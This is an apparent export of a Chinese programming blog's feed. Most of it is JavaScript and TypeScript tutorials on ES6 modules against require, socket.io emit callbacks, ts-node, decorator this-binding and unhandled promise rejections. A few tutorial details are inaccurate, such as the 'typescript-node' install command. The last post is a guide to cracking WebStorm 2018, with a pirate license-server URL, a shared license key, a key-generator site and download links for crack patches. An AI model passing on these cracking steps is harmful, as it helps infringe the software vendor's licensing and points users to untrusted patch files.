<p><strong>注意，export命令规定的是对外的接口，必须与模块内部的变量建立一一对应关系。但是module.exports是可以的</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 错误演示</span><br><span class="line">&#x2F;&#x2F; 报错</span><br><span class="line">export 1; &#x2F;&#x2F; 绝对不可以</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 报错</span><br><span class="line">var a &#x3D; 100;</span><br><span class="line">export a;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;module.exports</span><br><span class="line">var a &#x3D; 1;</span><br><span class="line">module.exports &#x3D; a</span><br></pre></td></tr></table></figure>
<p>export在导出接口的时候，必须与模块内部的变量具有一一对应的关系。直接导出1没有任何意义，也不可能在import的时候有一个变量与之对应。 export a 虽然看上去成立，但是 a 的值是一个数字，根本无法完成解构，因此必须写成 export {a} 的形式。即使a被赋值为一个function，也是不允许的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 写法一</span><br><span class="line">export var m &#x3D; 1;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 写法二</span><br><span class="line">var m &#x3D; 1;</span><br><span class="line">export &#123;m&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 写法三</span><br><span class="line">var n &#x3D; 1;</span><br><span class="line">export &#123;n as m&#125;;</span><br></pre></td></tr></table></figure>

<p><em><strong>注意：export可以在代码中导出多个</strong></em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var m &#x3D; 1;</span><br><span class="line">export &#123;m&#125;;&#x2F;&#x2F;导出m</span><br><span class="line"></span><br><span class="line">var b &#x3D; 2;</span><br><span class="line">export &#123;b&#125;&#x2F;&#x2F;导出b</span><br></pre></td></tr></table></figure>

<p>###<a href="https://developer.mozilla.org/en-US/docs/web/javascript/reference/statements/import">import</a>导入模块</p>
<p>import的语法跟require不同，而且import必须放在文件的最开始，且前面不允许有其他逻辑代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; import &quot;user.js&quot;</span><br><span class="line">import &#123; cube, foo &#125; from &#39;my-module&#39;;</span><br><span class="line">console.log(cube(3)); &#x2F;&#x2F; 27</span><br><span class="line">console.log(foo);    &#x2F;&#x2F; 4.555806215962888</span><br></pre></td></tr></table></figure>

<p>import后面跟上花括号的形式是最基本的用法，花括号里面的变量与export后面的变量一一对应。这里，你必须了解 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment">对象的解构赋值</a> 的知识，也可参考<a href="http://es6.ruanyifeng.com/#docs/destructuring">阮一峰的结构赋值</a></p>
<p>###as关键字<br>简单的说就是取一个别名。export中可以用，import中其实可以用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; a.js</span><br><span class="line">var a &#x3D; function() &#123;&#125;;</span><br><span class="line">export &#123;a as fun&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; b.js</span><br><span class="line">import &#123;fun as a&#125; from &#39;.&#x2F;a&#39;;</span><br><span class="line">a();</span><br></pre></td></tr></table></figure>
<p>export的时候，对外提供的接口是fun，它是a.js内部a这个函数的别名，但是在模块外面，认不到a，只能认到fun。<br>import中的as就很简单，就是你在使用模块里面的方法的时候，给这个方法取一个别名，好在当前的文件里面使用。<strong>两个不同文件可能都export同一个fun的对象</strong><br>###export default 命令<br>export default命令，为模块指定默认输出。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 第一组</span><br><span class="line">export default function crc32() &#123; &#x2F;&#x2F; 输出</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;</span><br><span class="line">import crc32 from &#39;crc32&#39;; &#x2F;&#x2F; 输入</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 第二组</span><br><span class="line">export function crc32() &#123; &#x2F;&#x2F; 输出</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;;</span><br><span class="line">import &#123;crc32&#125; from &#39;crc32&#39;; &#x2F;&#x2F; 输入</span><br></pre></td></tr></table></figure>
<p>default其实是as的语法糖，这个语法糖的好处就是import的时候，可以省去花括号{}。<br>###*符号<br>*代表所有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import * as _ from &#39;xxx.js&#39;;&#x2F;&#x2F;表示把xxx模块中的所有接口挂载到 _ 这个对象上</span><br></pre></td></tr></table></figure>
<p>通过*号直接继承某一个模块的接口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export * from &#39;_&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 等效于：</span><br><span class="line">import * as all from &#39;_&#39;;</span><br><span class="line">export all;</span><br></pre></td></tr></table></figure>
<p>尽量少用，它使用的所有的export的接口，但是你当前模块其实并不一定需要用到所有的接口，还是用{}按照需要去引用</p>
<p>###Require Or Import<br>require理论上可以运用在代码的任何地方，甚至不需要赋值给某个变量之后再使用；但是import则不同，它是编译时的（require是运行时的），它必须放在文件开头，而且使用格式也是确定的，不容置疑。它不会将整个模块运行后赋值给某个变量，而是只选择import的接口进行编译，这样在性能上比require好很多。</p>
<p>按照规范<em><strong>module.exports =&gt;require，export=&gt;import</strong></em>，但是现在开发为了兼容低版本的JS引擎会对import进行降级处理，会把import转换成require；这样就造成了各种方法可以混合使用，如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;import.js:导出模块a和d</span><br><span class="line">export class a &#123;&#x2F;&#x2F;分开导出</span><br><span class="line">    constructor(arg&#x3D;2) &#123;</span><br><span class="line">        this.t &#x3D; 1;</span><br><span class="line">        this.t2 &#x3D; arg;</span><br><span class="line">    &#125;</span><br><span class="line">    b()&#123;</span><br><span class="line">        console.log(&#39;b&#39;);</span><br><span class="line">        console.log(this.t2);</span><br><span class="line">    &#125;</span><br><span class="line">    c()&#123;</span><br><span class="line">        console.log(&#39;c&#39;)</span><br><span class="line">        console.log(this.t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var d &#x3D; function()&#123;</span><br><span class="line">&#125;;</span><br><span class="line">export &#123;d&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;require.js:导出模块a,d,e</span><br><span class="line">class a &#123;&#x2F;&#x2F;分开导出</span><br><span class="line">    constructor(arg&#x3D;2) &#123;</span><br><span class="line">        this.t &#x3D; 1;</span><br><span class="line">        this.t2 &#x3D; arg;</span><br><span class="line">    &#125;</span><br><span class="line">    b()&#123;</span><br><span class="line">        console.log(&#39;b&#39;);</span><br><span class="line">        console.log(this.t2);</span><br><span class="line">    &#125;</span><br><span class="line">    c()&#123;</span><br><span class="line">        console.log(&#39;c&#39;)</span><br><span class="line">        console.log(this.t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var d &#x3D; function()&#123;</span><br><span class="line">    console.log(d)</span><br><span class="line">&#125;;</span><br><span class="line">var e &#x3D; 1</span><br><span class="line">module.exports &#x3D; &#123;a,d,e&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;index.js</span><br><span class="line">var require_a &#x3D; require(&#39;.&#x2F;require&#39;)</span><br><span class="line">var import_a &#x3D; require(&#39;.&#x2F;import&#39;)</span><br><span class="line">import &#123;a as test&#125; from &#39;.&#x2F;import&#39;</span><br><span class="line">import a from &#39;.&#x2F;require&#39;</span><br><span class="line">import * as all_require from &#39;.&#x2F;require&#39;</span><br><span class="line">import * as all_import from &#39;.&#x2F;import&#39;</span><br><span class="line"></span><br><span class="line">console.log(require_a);&#x2F;&#x2F;&#123;a: ƒ, d: ƒ, e: 1&#125;</span><br><span class="line">console.log(import_a);&#x2F;&#x2F;&#123;a: ƒ, d: ƒ, __esModule: true&#125;</span><br><span class="line">console.log(test);&#x2F;&#x2F;ƒ a()</span><br><span class="line">console.log(a);&#x2F;&#x2F;&#123;a: ƒ, d: ƒ, e: 1&#125;</span><br><span class="line">console.log(all_require);&#x2F;&#x2F;&#123;a: ƒ, d: ƒ, e: 1, default: &#123;…&#125;&#125;</span><br><span class="line">console.log(all_import);&#x2F;&#x2F;&#123;a: ƒ, d: ƒ, __esModule: true&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;a1,a2数据不影响</span><br><span class="line">&#x2F;&#x2F;constructor可传参数，但参数名不能与变量名相同</span><br><span class="line">var a1 &#x3D; new test();</span><br><span class="line">var a2 &#x3D; new test(4);</span><br><span class="line"></span><br><span class="line">console.log(a1.t,a1.t2);&#x2F;&#x2F;1,2</span><br><span class="line">a1.b();&#x2F;&#x2F;b,2</span><br><span class="line">a1.t&#x3D;3;</span><br><span class="line">a1.c();&#x2F;&#x2F;c,3</span><br><span class="line"></span><br><span class="line">console.log(a2.t,a2.t2);&#x2F;&#x2F;1,4</span><br><span class="line">a2.b();&#x2F;&#x2F;b,4</span><br><span class="line">a2.t&#x3D;5;</span><br><span class="line">a2.c();&#x2F;&#x2F;c,5</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到在混用时require和import在编码是是都可以使用的，需要注意的是require是把所有模块加载进去，与import * 基本相同，但是import *会增加default属性。import需要指定模块名，如果不存在会返回undefined。</p>
<p><em><strong>require 取到整个对象</strong></em></p>
<p><em><strong>import a 取到default的对象，如果无default对象，在编译时会报错</strong></em></p>
<p><em><strong>import {a} 取到 a对象</strong></em></p>
<p><em><strong>import * as XX 取到所有对象，并放到XX里面</strong></em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;a.js</span><br><span class="line">export default class xxxx &#123;&#125;</span><br><span class="line"></span><br><span class="line">var xxx &#x3D; require(&#39;.&#x2F;a.js&#39;);&#x2F;&#x2F;&#123;default:ƒ xxx()&#125;</span><br><span class="line">import xxx from &#39;.&#x2F;a.js&#39;;&#x2F;&#x2F;ƒ xxx()</span><br></pre></td></tr></table></figure>
<p>当export有default时,在使用require时，需要从default中才能取到要使用的对象，而import可以直接拿到对应的属性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;a.js</span><br><span class="line">module.exports &#x3D; class a &#123;&#125;</span><br><span class="line"></span><br><span class="line">var a &#x3D; require(&#39;.&#x2F;a.js&#39;);&#x2F;&#x2F;ƒ xxx()</span><br><span class="line">import a from &#39;.&#x2F;a.js&#39;;&#x2F;&#x2F;ƒ xxx()</span><br></pre></td></tr></table></figure>
<p>如果module.exports导出的是单一的对象时，使用require和import取到的对象是同样的，都是可以直接使用，和default的效果基本一致。</p>
<p><em><strong>注意：webpack3在module.exports编译时，在模块前自增加了default属性</strong></em></p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>socke-io-emit-方法</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/socke-io-emit-%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>emit可以很方便的发送数据,例如：</p>
<p>socket.emit(‘action’);表示发送了一个action命令，命令是字符串的，在另一端接收时，可以这么写： socket.on(‘action’,function(){…});</p>
<p>socket.emit(‘action’,data);表示发送了一个action命令，还有data数据，在另一端接收时，可以这么写： socket.on(‘action’,function(data){…});</p>
<p>socket.emit(action,arg1,arg2); 表示发送了一个action命令，还有两个数据，在另一端接收时，可以这么写： socket.on(‘action’,function(arg1,arg2){…});</p>
<p>socket.emit(action,arg1,arg2,arg3,arg4); 如果是多个参数，就也应该知道什么意思了，同上</p>
<p>在emit方法中包含回调函数，例如：</p>
<p>socket.emit(‘action’,data, function(arg1,arg2){…} );那么这里面有一个回调函数可以在另一端调用，另一端可以这么写：socket.on(‘action’,function(data,fn){   fn(‘a’,’b’) ;  });</p>
<p>上面的data数据可以有0个或者多个，相应的在另一端改变function中参数的个数即可，function中的参数个数和顺序应该和发送时一致</p>
<p>上面的fn表示另一个端传递过来的参数，是个函数，写fn(‘a’,’b’) ;会回调函数执行。一次发送不应该写多个回调，否则只有最后一个起效，回调应作为最后一个参数。</p>
<p>例子：一个js文件(内容是下面的服务器端)，同一目录下放一个helloworld.html文件(内容是下面的客户端)，启动服务器，访问<a href="http://127.0.0.1/">http://127.0.0.1/</a></p>
<p>客户端：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 4.01 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;html4&#x2F;loose.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt; New Document &lt;&#x2F;title&gt;</span><br><span class="line">  &lt;meta name&#x3D;&quot;Generator&quot; content&#x3D;&quot;EditPlus&quot;&gt;</span><br><span class="line">  &lt;meta name&#x3D;&quot;Author&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">  &lt;meta name&#x3D;&quot;Keywords&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line">  &lt;meta name&#x3D;&quot;Description&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class="line"> &lt;&#x2F;head&gt;</span><br><span class="line">	&lt;script src&#x3D;&quot;&#x2F;socket.io&#x2F;socket.io.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  var socket &#x3D; io.connect(&#39;ws:&#x2F;&#x2F;127.0.0.1&#x2F;&#39;);</span><br><span class="line">  socket.emit(&#39;msg&#39;,&#39;You get my message?&#39;,function(data)&#123;</span><br><span class="line">    alert(data);</span><br><span class="line">   &#125;); </span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> </span><br><span class="line"> &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>服务器端： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var server&#x3D;require(&#39;http&#39;).createServer(handler); </span><br><span class="line">var io &#x3D; require(&#39;socket.io&#39;).listen(server);</span><br><span class="line">var fs&#x3D;require(&#39;fs&#39;);</span><br><span class="line">server.listen(80);</span><br><span class="line">function handler(req,res)&#123;</span><br><span class="line">	fs.readFile(__dirname+&#39;&#x2F;helloworld.html&#39;,</span><br><span class="line">	function(err, data)&#123;</span><br><span class="line">		if(err)&#123;</span><br><span class="line">			res.writeHead(500);</span><br><span class="line">			return res.end(&#39;Error loading index.html&#39;);</span><br><span class="line">		&#125;</span><br><span class="line">		res.writeHead(200);</span><br><span class="line">		res.end(data);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line">io.sockets.on(&#39;connection&#39;, function (socket) &#123;</span><br><span class="line">	  socket.on(&#39;msg&#39;, function (data,fn) &#123;</span><br><span class="line">		console.log(&#39;received message from client:&#39;+data);</span><br><span class="line">		fn(&#39;The server has been successfully received your message:&#39;+data);</span><br><span class="line">	  &#125;); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>ts-node直接运行typescript文件</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/ts-node%E7%9B%B4%E6%8E%A5%E8%BF%90%E8%A1%8Ctypescript%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p>  正常ts文件都要编译成JS文件才能运行，但是在开发时有时需要运行ts文件，但是每次都要配置package.json，还要安装，后来看到ts-node可以在vscode上运行ts文件。</p>
<h3 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;全局安装typescript和typescript-node</span><br><span class="line">npm install -g typescript</span><br><span class="line">npm install -g typescript-node</span><br></pre></td></tr></table></figure>
<p>  安装完成后就可以不用手动去编译成js文件，可以直接运行ts文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;foo.ts</span><br><span class="line">let foo &#x3D; &#123;</span><br><span class="line">  baz: &#123;</span><br><span class="line">    a: 1</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">console.log(foo);</span><br></pre></td></tr></table></figure>
<h3 id="执行命令-ts-node-ts"><a href="#执行命令-ts-node-ts" class="headerlink" title="执行命令***ts-node ****.ts***"></a>执行命令***ts-node ****.ts***</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ts-node foo.ts</span><br><span class="line">&#123; baz: &#123; a: 1 &#125; &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>typeScript Decorators 的this作用域</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/typeScript-Decorators-%E7%9A%84this%E4%BD%9C%E7%94%A8%E5%9F%9F/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class FooBar &#123;</span><br><span class="line">    @log</span><br><span class="line">    public foo(arg): void &#123; </span><br><span class="line">        console.log(this);</span><br><span class="line">        this.bar(arg);</span><br><span class="line">    &#125;</span><br><span class="line">    @log</span><br><span class="line">    private bar(arg) : void &#123; </span><br><span class="line">        console.log(this, &quot;bar&quot;, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function log(target: Function, key: string, value: any) &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">        value: (...args: any[]) &#x3D;&gt; &#123;</span><br><span class="line">            var a &#x3D; args.map(a &#x3D;&gt; JSON.stringify(a)).join();</span><br><span class="line">            var result &#x3D; value.value.apply(this, args); &#x2F;&#x2F; How to avoid hard coded this?</span><br><span class="line">            var r &#x3D; JSON.stringify(result);</span><br><span class="line">            console.log(&#96;Call: $&#123;key&#125;($&#123;a&#125;) &#x3D;&gt; $&#123;r&#125;&#96;);</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个时候会提示<strong>Uncaught TypeError: this.bar is not a function</strong>.<br>这是由于log中使用了箭头函数，改变了方法的作用域。this对象指向的是当前函数的上下文，而不是调用log方法的this对象。这边不要使用箭头函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function log(target: Object, key: string, value: any) &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">        value: function(...args: any[]) &#123;</span><br><span class="line">            var a &#x3D; args.map(a &#x3D;&gt; JSON.stringify(a)).join();</span><br><span class="line">            var result &#x3D; value.value.apply(this, args);</span><br><span class="line">            var r &#x3D; JSON.stringify(result);</span><br><span class="line">            console.log(&#96;Call: $&#123;key&#125;($&#123;a&#125;) &#x3D;&gt; $&#123;r&#125;&#96;);</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>建议编辑descriptor/value 参数作为返回值。因此我们暂存了 descriptor 中当前value，避免覆盖其他注解对这个 descriptor 可能的修改。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function log(target: Object, key: string, descriptor: TypedPropertyDescriptor&lt;any&gt;) &#123;</span><br><span class="line">    var originalMethod &#x3D; descriptor.value;</span><br><span class="line"></span><br><span class="line">    descriptor.value &#x3D; function(...args: any[]) &#123;</span><br><span class="line">        var a &#x3D; args.map(a &#x3D;&gt; JSON.stringify(a)).join();</span><br><span class="line">        var result &#x3D; originalMethod.apply(this, args);</span><br><span class="line">        var r &#x3D; JSON.stringify(result);</span><br><span class="line">        console.log(&#96;Call: $&#123;key&#125;($&#123;a&#125;) &#x3D;&gt; $&#123;r&#125;&#96;);</span><br><span class="line">        return result;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    return descriptor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请参看 <a href="https://link.zhihu.com/?target=http://stackoverflow.com/questions/30329832/how-to-avoid-hard-coded-this-in-decorators%23answer-30330602">Stack-Overflow 上的答案</a> 了解上面两个问题的更多信息</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>unhandled promise rejection</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/unhandled-promise-rejection/</url>
    <content><![CDATA[<p>  Node 如下的报错：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(node:17928) UnhandledPromiseRejectionWarning: Unhandled promise rejection (rejection id: 2): Error</span><br><span class="line">(node:17928) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.</span><br></pre></td></tr></table></figure>
<p>先来看一下 unhandled promise rejection。</p>
<h3 id="在什么情况下会出现：UnhandledPromiseRejectionWarning"><a href="#在什么情况下会出现：UnhandledPromiseRejectionWarning" class="headerlink" title="在什么情况下会出现：UnhandledPromiseRejectionWarning"></a>在什么情况下会出现：UnhandledPromiseRejectionWarning</h3><blockquote>
<p>或者说：什么是 unhandled promise rejection</p>
</blockquote>
<p>当 Promise 的状态变为 rejection 时，我们没有正确处理，让其一直冒泡（propagation），直至被进程捕获。这个 Promise 就被称为 unhandled promise rejection。</p>
<p>Promise 的异常，有两种触发方式：</p>
<ul>
<li>主动调用 reject 方法</li>
<li>抛出异常（exception）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; reject</span><br><span class="line">new Promise((resolve, reject) &#x3D;&gt; &#123;</span><br><span class="line">  reject(&#39;timeout&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; exception</span><br><span class="line">new Promise((resolve, reject) &#x3D;&gt; &#123;</span><br><span class="line">  undefinedVariable();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
我们有两种方式去处理 rejection，方式二 是 方式一 的语法糖。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 方式一 .then(undefined, () &#x3D;&gt; &#123;&#125;)</span><br><span class="line">new Promise((resolve, reject) &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">  reject(&#39;timeout&#39;);</span><br><span class="line">&#125;).then(undefined, (error) &#x3D;&gt; &#123;</span><br><span class="line">  console.error(error);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 方式二 .catch(() &#x3D;&gt; &#123;&#125;)</span><br><span class="line">new Promise((resolve, reject) &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">  reject(&#39;timeout&#39;)</span><br><span class="line">&#125;).catch((error) &#x3D;&gt; &#123;</span><br><span class="line">  console.error(error);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
关键点是：不能在让异常继续往上抛（propagation）了，否则还是会触发 unhandled promise rejection。如下代码所示：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 方式一</span><br><span class="line">new Promise((resolve, reject) &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">  reject(&#39;timeout&#39;);</span><br><span class="line">&#125;).then(undefined, (error) &#x3D;&gt; &#123;</span><br><span class="line">  throw new Error(error);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 方式二</span><br><span class="line">new Promise((resolve, reject) &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">  reject(&#39;timeout&#39;);</span><br><span class="line">&#125;).catch((error) &#x3D;&gt; &#123;</span><br><span class="line">  throw new Error(error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
原因在于：不论 .then(onFulfilled, onRejection) 中的 onFulfilled 还是 onRejection 返回的都是 Promise，如果在他们内部抛出了异常，那么意味着接下来的 then chains 还是 rejection 的。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const promise2 &#x3D; (new Promise((resolve, reject) &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">  reject(&#39;timeout&#39;);</span><br><span class="line">&#125;).catch((error) &#x3D;&gt; &#123;</span><br><span class="line">  throw new Error(error);</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>
在这里，对于 promise2 来讲，它的 rejectiton 还没有被 handle。所以，还需要做如下处理：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const promise2 &#x3D; (new Promise((resolve, reject) &#x3D;&gt; &#123;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">  reject(&#39;timeout&#39;);</span><br><span class="line">&#125;).catch((error) &#x3D;&gt; &#123;</span><br><span class="line">  throw new Error(error);</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">promise2.catch((error) &#x3D;&gt; &#123;</span><br><span class="line">  console.error(error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="Async-Await-中"><a href="#Async-Await-中" class="headerlink" title="Async/Await 中"></a>Async/Await 中</h3>在 Async/Await 中，unhandled promise rejection 是这样触发：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; Promise 未能阻止异常抛出</span><br><span class="line">;(async () &#x3D;&gt; &#123;</span><br><span class="line">  await (new Promise((resolve, reject) &#x3D;&gt; &#123;</span><br><span class="line">    reject(&#39;timeout&#39;);</span><br><span class="line">  &#125;));</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; async 没有妥善处理异常</span><br><span class="line">;(async () &#x3D;&gt; &#123;</span><br><span class="line">  try &#123;</span><br><span class="line">    await (new Promise((resolve, reject) &#x3D;&gt; &#123;</span><br><span class="line">      reject(&#39;timeout&#39;);</span><br><span class="line">    &#125;));</span><br><span class="line">  &#125; catch(e) &#123;</span><br><span class="line">    throw new Error(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<h3 id="怎么得到-错误堆栈"><a href="#怎么得到-错误堆栈" class="headerlink" title="怎么得到 错误堆栈"></a>怎么得到 错误堆栈</h3><blockquote>
<p>Node.js v8.1.2 Documentation: <a href="https://nodejs.org/api/process.html#process_event_unhandledrejection">https://nodejs.org/api/process.html#process_event_unhandledrejection</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">process.on(&#39;unhandledRejection&#39;, (reason, p) &#x3D;&gt; &#123;</span><br><span class="line">  console.log(&#39;Unhandled Rejection at:&#39;, p, &#39;reason:&#39;, reason);</span><br><span class="line">  &#x2F;&#x2F; application specific logging, throwing an error, or other logic here</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>webstorm 2018 激活破解方法大全</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/webstorm-2018-%E6%BF%80%E6%B4%BB%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E5%A4%A7%E5%85%A8/</url>
    <content><![CDATA[<p><strong>方法一：（更新时间：2018/4/8）v3.3</strong></p>
<hr>
<p>注册时，在打开的License Activation窗口中选择“License server”，在输入框输入下面的网址：</p>
<p><a href="http://idea.wrbugtest.tk/">http://idea.wrbugtest.tk/</a> (2018/06/16)</p>
<p>点击：Activate即可。</p>
<p>网友分享 : [感谢 weixin_41405655 ]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; LICENSE BEGIN &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">37362-12042010</span><br><span class="line">00000!enirob&quot;h4FBnAgcpdNnIZydA</span><br><span class="line">9AikY7i7Ecn7GW7EvybU&quot;YwuAPkdCw</span><br><span class="line">Qn7Fp!9FpNvujTEghtbTGz1DutM216</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; LICENSE END &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>复制license begin和license end 之间的一段代码可以用</p>
<p><strong>方法二：获取注册码</strong></p>
<hr>
<p>打开网址（<a href="http://idea.lanyus.com/">IntelliJ IDEA 注册码</a>），我们能看到下面的界面，直接点击获取激活码，将生成的激活码粘贴到WebStorm激活对话框中的Lisence Code输入框，点击OK即可破解。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-f51a26fb0fcc173e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-e3b97f62ba6355d4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><strong>方法三：使用破解补丁</strong></p>
<hr>
<p>首先下载补丁，看图！</p>
<p>2017版下载地址 : 链接：<a href="https://pan.baidu.com/s/1Ed2kNzmGNrU5AsXbC2LkEw">https://pan.baidu.com/s/1Ed2kNzmGNrU5AsXbC2LkEw</a> 密码：465h</p>
<p>2018版下载地址 : 链接：<a href="https://pan.baidu.com/s/1TZ_kXvkgF2t3hKusQl5TDQ">https://pan.baidu.com/s/1TZ_kXvkgF2t3hKusQl5TDQ</a> 密码：vc39</p>
